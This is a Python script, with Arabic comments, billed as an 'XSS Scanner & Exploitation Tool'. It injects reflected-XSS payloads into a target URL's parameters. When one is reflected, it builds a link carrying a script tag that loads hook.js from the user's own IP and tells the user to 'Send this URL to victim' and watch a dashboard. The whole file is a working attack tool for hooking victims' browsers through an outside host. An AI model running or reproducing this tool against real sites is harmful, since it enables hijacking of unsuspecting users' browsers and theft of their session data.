#!/usr/bin/env python3
import requests
import urllib.parse
from bs4 import BeautifulSoup

class XSSScanner:
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]
        
        self.hook_payloads = [
            "<script src='http://YOUR_IP:8000/hook.js'></script>",
            "<img src=x onerror=\"var s=document.createElement('script');s.src='http://YOUR_IP:8000/hook.js';document.head.appendChild(s)\">"
        ]
    
    def scan_url(self, url, hook_ip=None):
        print(f"[*] Scanning: {url}")
        
        # فحص parameters في URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params:
            print(f"[*] Testing parameter: {param}")
            
            for payload in self.payloads:
                test_url = self.inject_payload(url, param, payload)
                
                try:
                    response = requests.get(test_url, timeout=10)
                    if payload in response.text:
                        print(f"[!] XSS Found: {param} -> {payload}")
                        
                        # إذا طلبوا hook، نحقن الـ hook
                        if hook_ip:
                            hook_payload = f"<script src='http://{hook_ip}:8000/hook.js'></script>"
                            hook_url = self.inject_payload(url, param, hook_payload)
                            print(f"[+] Hook URL: {hook_url}")
                            return hook_url
                        
                        return test_url
                        
                except Exception as e:
                    print(f"[-] Error testing {param}: {e}")
        
        print("[-] No XSS vulnerabilities found")
        return None
    
    def inject_payload(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        query_dict = urllib.parse.parse_qs(parsed.query)
        query_dict[param] = [payload]
        
        new_query = urllib.parse.urlencode(query_dict, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

def main():
    scanner = XSSScanner()
    
    print("XSS Scanner & Exploitation Tool")
    target = input("Enter target URL: ")
    hook_ip = input("Enter your IP for hook [localhost]: ") or "localhost"
    
    # استبدل الـ IP في الـ payloads
    scanner.hook_payloads = [p.replace('YOUR_IP', hook_ip) for p in scanner.hook_payloads]
    
    vulnerable_url = scanner.scan_url(target, hook_ip)
    
    if vulnerable_url:
        print(f"\n[+] Exploitation ready!")
        print(f"[+] Send this URL to victim: {vulnerable_url}")
        print(f"[+] Check dashboard: http://{hook_ip}:8000/dashboard")

if __name__ == "__main__":
    main()